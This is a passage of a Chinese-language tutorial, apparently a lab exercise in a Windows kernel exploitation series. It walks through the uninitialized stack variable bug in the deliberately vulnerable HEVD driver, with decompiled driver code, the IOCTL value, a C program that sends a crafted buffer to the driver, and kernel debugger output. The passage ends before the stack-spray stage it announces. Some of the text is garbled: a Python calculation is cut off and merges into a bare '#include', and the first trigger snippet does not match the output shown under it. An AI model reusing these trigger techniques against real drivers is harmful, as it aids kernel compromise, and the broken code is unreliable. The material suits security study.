# 0x00：前言
这是 Windows kernel exploit
系列的第六部分，前一篇我们讲了空指针解引用，这一篇我们讲内核未初始化栈利用，这篇虽然是内核栈的利用，与前面不同的是，这里需要引入一个新利用手法 =>
栈喷射，需要你对内核栈和用户栈理解的比较深入，看此文章之前你需要有以下准备：
  * Windows 7 x86 sp1虚拟机
  * 配置好windbg等调试工具，建议配合VirtualKD使用
  * HEVD+OSR Loader配合构造漏洞环境
传送门：
[+] [Windows Kernel Exploit(一) -> UAF](https://xz.aliyun.com/t/5493)
[+] [Windows Kernel Exploit(二) -> StackOverflow](https://xz.aliyun.com/t/5536)
[+] [Windows Kernel Exploit(三) -> Write-What-Where](https://xz.aliyun.com/t/5615)
[+] [Windows Kernel Exploit(四) -> PoolOverflow](https://xz.aliyun.com/t/5709)
[+] [Windows Kernel Exploit(五) -> Null-Pointer-Dereference](https://xz.aliyun.com/t/5721)
# 0x01：漏洞原理
## 未初始化栈变量
我们还是先用IDA分析`HEVD.sys`，找到相应的函数`TriggerUninitializedStackVariable`
    int __stdcall TriggerUninitializedStackVariable(void *UserBuffer)
    {
      int UserValue; // esi
      _UNINITIALIZED_STACK_VARIABLE UninitializedStackVariable; // [esp+10h] [ebp-10Ch]
      CPPEH_RECORD ms_exc; // [esp+104h] [ebp-18h]
      ms_exc.registration.TryLevel = 0;
      ProbeForRead(UserBuffer, 0xF0u, 4u);
      UserValue = *(_DWORD *)UserBuffer;
      DbgPrint("[+] UserValue: 0x%p\n", *(_DWORD *)UserBuffer);
      DbgPrint("[+] UninitializedStackVariable Address: 0x%p\n", &UninitializedStackVariable);
      if ( UserValue == 0xBAD0B0B0 )
      {
        UninitializedStackVariable.Value = 0xBAD0B0B0;
        UninitializedStackVariable.Callback = (void (__stdcall *)())UninitializedStackVariableObjectCallback;
      }
      DbgPrint("[+] UninitializedStackVariable.Value: 0x%p\n", UninitializedStackVariable.Value);
      DbgPrint("[+] UninitializedStackVariable.Callback: 0x%p\n", UninitializedStackVariable.Callback);
      DbgPrint("[+] Triggering Uninitialized Stack Variable Vulnerability\n");
      if ( UninitializedStackVariable.Callback )
        UninitializedStackVariable.Callback();
      return 0;
    }
我们仔细分析一下，首先函数将一个值设为0，`ms_exc`原型如下，它其实就是一个异常处理机制(预示着下面肯定要出异常)，然后我们还是将传入的`UserBuffer`和
0xBAD0B0B0
比较，如果相等的话就给`UninitializedStackVariable`函数的一些参数赋值，后面又判断了回调函数的存在性，最后调用回调函数，也就是说，我们传入的值不同的话可能就存在利用点，所以我们将聚焦点移到`UninitializedStackVariable`函数上
    typedef struct CPPEH_RECORD      
    {      
        DWORD old_esp;  //ESP     
        DWORD exc_ptr;  //GetExceptionInformation return value     
        DWORD prev_er;  //prev _EXCEPTION_REGISTRATION_RECORD     
        DWORD handler;  //Handler     
        DWORD msEH_ptr; //Scopetable     
        DWORD disabled; //TryLevel     
    }CPPEH_RECORD,*PCPPEH_RECORD;
我们来看一下源码里是如何介绍的，显而易见，一个初始化将`UninitializedMemory`置为了NULL，而另一个没有，要清楚的是我们现在看的是内核的漏洞，与用户模式并不相同，所以审计代码的时候要非常仔细
    #ifdef SECURE
        //
        // Secure Note: This is secure because the developer is properly initializing
        // UNINITIALIZED_MEMORY_STACK to NULL and checks for NULL pointer before calling
        // the callback
        //
        UNINITIALIZED_MEMORY_STACK UninitializedMemory = { 0 };
    #else
        //
        // Vulnerability Note: This is a vanilla Uninitialized Memory in Stack vulnerability
        // because the developer is not initializing 'UNINITIALIZED_MEMORY_STACK' structure
        // before calling the callback when 'MagicValue' does not match 'UserValue'
        //
        UNINITIALIZED_MEMORY_STACK UninitializedMemory;
# 0x02：漏洞利用
## 控制码
我们还是从控制码入手，在`HackSysExtremeVulnerableDriver.h`中定位到相应的定义
    #define HEVD_IOCTL_UNINITIALIZED_MEMORY_STACK                    IOCTL(0x80B)
然后我们用python计算一下控制码
    >>> hex((0x00000022 
    #include
    HANDLE hDevice = NULL;
    BOOL init()
    {
        // Get HANDLE
        hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
            GENERIC_READ | GENERIC_WRITE,
            NULL,
            NULL,
            OPEN_EXISTING,
            NULL,
            NULL);
        printf("[+]Start to get HANDLE...\n");
        if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)
        {
            return FALSE;
        }
        printf("[+]Success to get HANDLE!\n");
        return TRUE;
    }
    VOID Trigger_shellcode()
    {
        DWORD bReturn = 0;
        char buf[4] = { 0 };
        *(PDWORD32)(buf) = 0xBAD0B0B0+1;
        DeviceIoControl(hDevice, 0x22202f, buf, 4, NULL, 0, &bReturn, NULL);
    }
    int main()
    {
        if (init() == FALSE)
        {
            printf("[+]Failed to get HANDLE!!!\n");
            system("pause");
            return 0;
        }
        Trigger_shellcode();
        return 0;
    }
这里我们打印的信息如下，可以看到对`UninitializedStackVariable`的一些对象进行了正确的赋值
    ****** HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE ******
    [+] UserValue: 0xBAD0B0B0
    [+] UninitializedStackVariable Address: 0x8E99B9C8
    [+] UninitializedStackVariable.Value: 0xBAD0B0B0
    [+] UninitializedStackVariable.Callback: 0x8D6A3EE8
    [+] Triggering Uninitialized Stack Variable Vulnerability
    [+] Uninitialized Stack Variable Object Callback
    ****** HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE ******
我们尝试传入不同的值
    VOID Trigger_shellcode()
    {
        DWORD bReturn = 0;
        char buf[4] = { 0 };
        *(PDWORD32)(buf) = 0xBAD0B0B0+1;
        DeviceIoControl(hDevice, 0x22202f, buf, 4, NULL, 0, &bReturn, NULL);
    }
运行效果如下，因为有异常处理机制，所以这里并不会蓝屏
    0: kd> g
    ****** HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE ******
    [+] UserValue: 0xBAD0B0B1
    [+] UninitializedStackVariable Address: 0x97E789C8
    [+] UninitializedStackVariable.Value: 0x00000002